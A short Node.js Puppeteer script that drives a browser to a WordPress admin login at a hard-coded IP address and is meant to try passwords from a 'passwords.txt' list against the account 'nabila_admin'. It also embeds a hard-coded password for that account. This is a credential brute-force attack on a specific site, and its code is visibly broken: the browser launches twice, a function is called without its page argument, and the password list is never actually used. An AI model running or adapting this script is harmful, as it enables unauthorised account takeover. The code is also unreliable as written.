const puppeteer = require('puppeteer');
const fs= require('fs');
let mdp=fs.readFileSync("passwords.txt", "utf8");

let i = 0;

(async () => {
    let password_found=false;
  await puppeteer.launch({ headless: false, defaultViewport: null, });
  const browser = await puppeteer.launch({
    headless: false,
    defaultViewport: null,
  });
const page = await browser.newPage();
await page.goto('http://52.47.83.211/wp-admin');
await page.waitForSelector('input[id="user_login"]');
await page.type('input[id="user_login"]', 'nabila_admin');
//await page.type('input[id="user_pass"]', 'Nabila.06');
//await page.click('input[id="wp-submit"]');
await verif_mdp();
})();

async function verif_mdp(page) {
    await page.type('input[id="user_pass"]', 'Nabila.06');
    await page.waitForSelector('#wp-submit');
    await page.click('input[id="wp-submit"]');

    err = await page.waitForSelector('#login_error');
    if(err){
        return await verif_mdp(page, mdp[i++]);
    }
    
}


